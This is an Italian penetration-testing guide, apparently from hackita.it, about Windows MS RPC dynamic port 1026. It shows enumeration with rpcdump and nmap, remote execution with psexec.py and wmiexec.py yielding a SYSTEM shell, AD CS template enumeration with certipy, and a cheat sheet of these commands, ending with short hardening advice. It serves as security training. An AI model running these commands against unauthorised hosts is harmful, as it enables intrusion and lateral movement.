---
title: 'Porta 1026 MS RPC: endpoint dinamici Windows, porta 135 e servizi remoti.'
slug: porta-1026-rpc
description: >-
  Scopri cos’è la porta 1026 in ambito MS RPC, perché va correlata all’endpoint
  mapper sulla 135 e come le porte RPC dinamiche cambino tra sistemi legacy e
  Windows moderni, influenzando enumerazione, firewalling e lateral movement.
image: /porta-1026-rpc.webp
draft: false
date: 2026-04-10T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - endpoint-mapper
  - rpc-dynamic-port
---

> **Executive Summary** — La porta 1026 è la seconda porta dinamica RPC assegnata da Windows, immediatamente dopo la 1025. Come per la 1025, il servizio che la occupa varia per sistema — tipicamente Service Control Manager, Event Log, DCOM o certificati. La guida alla [porta 1025 MS RPC](https://hackita.it/articoli/porta-1025-ms-rpc) copre il meccanismo completo delle porte RPC dinamiche; qui ci concentriamo sulle specificità della 1026 e sui servizi che la occupano più frequentemente.

```id="s4n8ld"
TL;DR

- Porta 1026 = seconda porta dinamica RPC su Windows — stessa logica della 1025, servizio diverso
- rpcdump sulla porta 135 rivela esattamente quale servizio risponde sulla 1026
- I servizi più comuni su 1026: Service Control Manager (SCM), Certificate Services, Event Log

```

Porta 1026 RPC è una porta dinamica TCP assegnata ai servizi Windows RPC. L'enumerazione porta 1026 è identica alla 1025: interroghi l'endpoint mapper (135) con rpcdump per scoprire il servizio. La porta 1026 vulnerabilità dipendono dal servizio specifico che la occupa. Nella kill chain, se la 1026 ospita SCM (Service Control Manager), è il canale usato da PsExec per creare servizi remoti.

## 1. Enumerazione

### Identifica il servizio sulla 1026

```bash
rpcdump.py 10.10.10.10 | grep 1026
```

**Output tipici:**

**Caso 1 — Service Control Manager:**

```
Protocol: [MS-SCMR]: Service Control Manager Remote Protocol
Provider: services.exe
Bindings: ncacn_ip_tcp:10.10.10.10[1026]
```

**Caso 2 — Certificate Services:**

```
Protocol: [MS-ICPR]: ICertPassage Remote Protocol
Provider: certsrv.exe
Bindings: ncacn_ip_tcp:10.10.10.10[1026]
```

**Caso 3 — Event Log:**

```
Protocol: [MS-EVEN6]: EventLog Remoting Protocol
Provider: wevtsvc.dll
Bindings: ncacn_ip_tcp:10.10.10.10[1026]
```

**Cosa fai dopo:** dipende dal servizio trovato.

* **SCM (services.exe)**: è il target di PsExec — `psexec.py domain/admin:pass@10.10.10.10`
* **Certificate Services (certsrv.exe)**: indica AD CS — potenziale per [certificate abuse ESC1-ESC8](https://hackita.it/articoli/active-directory)
* **Event Log**: meno interessante offensivamente, ma conferma host Windows attivo

## 2. Tecniche Offensive per Servizio

**Se SCM sulla 1026:**

```bash
# PsExec usa SCM per creare un servizio remoto
psexec.py domain/admin:Password123@10.10.10.10
```

```
C:\Windows\system32> whoami
nt authority\system
```

**Se Certificate Services sulla 1026:**

```bash
# Enumera template vulnerabili
certipy find -u user@corp.local -p pass -dc-ip 10.10.10.10
```

Leggi la nostra guida completa su [certipy](https://hackita.it/articoli/certipy) e su come sfruttare tutte le [esc da 1 a 16 in fase di privilege escalation](https://hackita.it/articoli/adcs-esc1-esc16/)

**Se WMI sulla 1026:**

```bash
wmiexec.py domain/admin:pass@10.10.10.10
```

## 3. Scan combinato porte RPC

```bash
# Scan completo delle porte RPC dinamiche + endpoint mapping
nmap -sV -p 135,1025-1035,49152-49170 10.10.10.10 --open
rpcdump.py 10.10.10.10
```

Questo rivela l'intera mappa dei servizi RPC — ogni porta con il suo servizio specifico. Per il [lateral movement via DCOM](https://hackita.it/articoli/porta-593-rpc-http), identifica le porte che ospitano DCOM e usale con `dcomexec.py`.

## 4. Cheat Sheet Finale

| Azione              | Comando                                |
| ------------------- | -------------------------------------- |
| Scan                | `nmap -sV -p 135,1026 [target]`        |
| Identify service    | `rpcdump.py [target] \| grep 1026`     |
| Full RPC map        | `rpcdump.py [target]`                  |
| PsExec (se SCM)     | `psexec.py domain/user:pass@[target]`  |
| WMI exec            | `wmiexec.py domain/user:pass@[target]` |
| Cert enum (se ICPR) | `certipy find -dc-ip [target]`         |

### Hardening

Identico alla porta 1025: restringi il range RPC dinamico, limita l'accesso con Windows Firewall, segmenta le VLAN.

***

Riferimento: MS-RPCE, MS-SCMR. Uso esclusivo in ambienti autorizzati. Approfondimento: [https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/service-overview-and-network-port-requirements](https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/service-overview-and-network-port-requirements)

> [hackita.it/supporto](https://hackita.it/supporto) — [hackita.it/servizi](https://hackita.it/servizi).
